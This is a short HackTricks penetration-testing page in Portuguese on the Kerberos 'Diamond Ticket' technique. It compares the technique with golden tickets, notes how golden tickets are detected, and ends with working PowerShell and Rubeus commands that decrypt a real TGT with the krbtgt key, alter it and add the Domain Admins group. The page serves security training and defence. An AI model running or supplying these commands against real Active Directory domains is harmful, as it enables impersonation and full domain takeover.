# Diamond Ticket

{{#include ../../banners/hacktricks-training.md}}

## Diamond Ticket

**Como um bilhete dourado**, um bilhete de diamante é um TGT que pode ser usado para **acessar qualquer serviço como qualquer usuário**. Um bilhete dourado é forjado completamente offline, criptografado com o hash krbtgt daquele domínio, e então passado para uma sessão de logon para uso. Como os controladores de domínio não rastreiam os TGTs que (ou eles) emitiram legitimamente, eles aceitarão felizmente TGTs que são criptografados com seu próprio hash krbtgt.

Existem duas técnicas comuns para detectar o uso de bilhetes dourados:

- Procure por TGS-REQs que não têm um AS-REQ correspondente.
- Procure por TGTs que têm valores absurdos, como o tempo de vida padrão de 10 anos do Mimikatz.

Um **bilhete de diamante** é feito por **modificando os campos de um TGT legítimo que foi emitido por um DC**. Isso é alcançado por **solicitar** um **TGT**, **descriptografá-lo** com o hash krbtgt do domínio, **modificar** os campos desejados do bilhete e, em seguida, **recriptografá-lo**. Isso **supera as duas desvantagens mencionadas anteriormente** de um bilhete dourado porque:

- TGS-REQs terão um AS-REQ anterior.
- O TGT foi emitido por um DC, o que significa que terá todos os detalhes corretos da política Kerberos do domínio. Embora esses possam ser forjados com precisão em um bilhete dourado, é mais complexo e suscetível a erros.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
{{#include ../../banners/hacktricks-training.md}}
